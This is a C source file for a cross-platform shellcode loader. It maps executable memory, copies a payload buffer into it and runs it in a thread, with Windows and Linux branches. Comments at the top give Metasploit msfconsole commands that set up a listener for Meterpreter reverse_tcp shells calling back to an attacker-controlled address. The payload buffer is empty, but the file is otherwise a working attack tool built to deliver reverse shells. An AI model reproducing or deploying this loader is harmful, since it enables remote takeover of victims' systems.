// msfconsole -qx 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; set EXITFUNC thread; run'
// msfconsole -qx 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.19.128; run'

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <threads.h>
#endif

static unsigned char buf[] = "";


// Thread function wrapper: casts the payload pointer to a function and calls it
#ifdef _WIN32
DWORD WINAPI thread_func(LPVOID arg) {
#else
int thread_func(void* arg) {
#endif
    void (*func)(void) = (void (*)(void))arg;
    func();
    return 0;
}

int main() {
    size_t bufSize = sizeof(buf);

    // Allocate executable memory
#ifdef _WIN32
    unsigned char* addr = (unsigned char*)VirtualAlloc(
        NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (addr == NULL) {
        fprintf(stderr, "Memory Allocation Failed\n");
        return 1;
    }
#else
    unsigned char* addr = (unsigned char*)mmap(
        NULL, bufSize,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
    );
    if (addr == MAP_FAILED) {
        fprintf(stderr, "Memory Allocation Failed\n");
        return 1;
    }
#endif

    memcpy(addr, buf, bufSize);

    // Flush instruction cache (GCC/Clang only, no-op on x86 but good practice on ARM)
#ifndef _WIN32
    __builtin___clear_cache((char*)addr, (char*)addr + bufSize);
#endif

    // Create and run thread
#ifdef _WIN32
    HANDLE thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)thread_func,
        addr,
        0,
        NULL
    );
    if (thread == NULL) {
        fprintf(stderr, "Thread Creation Failed!\n");
        VirtualFree(addr, 0, MEM_RELEASE);
        return 1;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
#else
    thrd_t thread;
    if (thrd_create(&thread, thread_func, addr) != thrd_success) {
        fprintf(stderr, "Thread Creation Failed!\n");
        munmap(addr, bufSize);
        return 1;
    }
    thrd_join(thread, NULL);
#endif

    // Free executable memory
#ifdef _WIN32
    VirtualFree(addr, 0, MEM_RELEASE);
#else
    munmap(addr, bufSize);
#endif

    return 0;
}
